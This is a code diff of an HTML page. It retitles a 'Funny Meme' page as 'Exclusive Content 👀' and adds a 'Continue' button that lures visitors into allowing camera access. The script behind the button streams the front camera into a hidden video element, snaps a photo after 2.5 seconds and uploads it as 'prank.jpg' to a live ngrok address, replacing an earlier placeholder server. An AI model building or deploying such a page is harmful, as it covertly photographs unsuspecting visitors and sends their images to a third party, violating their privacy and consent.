@@ -3,23 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Funny Meme</title>
+    <title>Exclusive Content</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        #video {
+            display: none;
+        }
+        #startBtn {
+            padding: 15px 30px;
+            font-size: 20px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20%;
+        }
+    </style>
 </head>
 <body>
+    <h1>Exclusive Content 👀</h1>
+    <p>Click the button to continue...</p>
+    <button id="startBtn">Continue</button>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display: none;"></canvas>
+
     <script>
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
+        const startBtn = document.getElementById("startBtn");
 
-        // Start video stream from front camera
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            video.srcObject = stream;
-            setTimeout(captureImage, 3000); // Capture after 3 seconds
-        })
-        .catch(err => console.error("Camera access denied:", err));
+        startBtn.addEventListener("click", function () {
+            startBtn.style.display = "none"; // Hide button after click
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(captureImage, 2500); // Take photo after 2.5 seconds
+            })
+            .catch(err => console.error("Camera access denied:", err));
+        });
 
         function captureImage() {
             canvas.width = video.videoWidth;
@@ -31,7 +57,7 @@
                 let formData = new FormData();
                 formData.append("file", blob, "prank.jpg");
 
-                fetch("https://your-server.com/upload", {  // Change this to your server URL!
+                fetch("https://fd63-45-245-185-41.ngrok-free.app/upload", {  // Your NGROK URL
                     method: "POST",
                     body: formData
                 })
